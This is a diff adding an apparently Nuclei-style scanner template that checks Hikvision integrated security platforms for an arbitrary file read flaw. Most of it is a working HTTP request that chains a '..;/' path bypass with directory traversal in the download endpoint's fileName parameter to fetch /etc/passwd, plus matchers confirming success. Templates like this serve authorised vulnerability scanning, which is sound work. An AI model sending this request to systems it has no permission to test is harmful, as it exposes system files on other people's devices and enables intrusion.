@@ -1,0 +1,25 @@
+id: Hikvision_32
+info:
+  name: 海康威视综合安防download任意文件读取
+  author: YanXi
+  severity: medium
+  description: description
+  reference:
+    - https://
+  tags: Hikvision
+http:
+  - raw:
+      - |-
+        GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '0x00137607'
+      - type: word
+        part: body
+        words:
+          - root
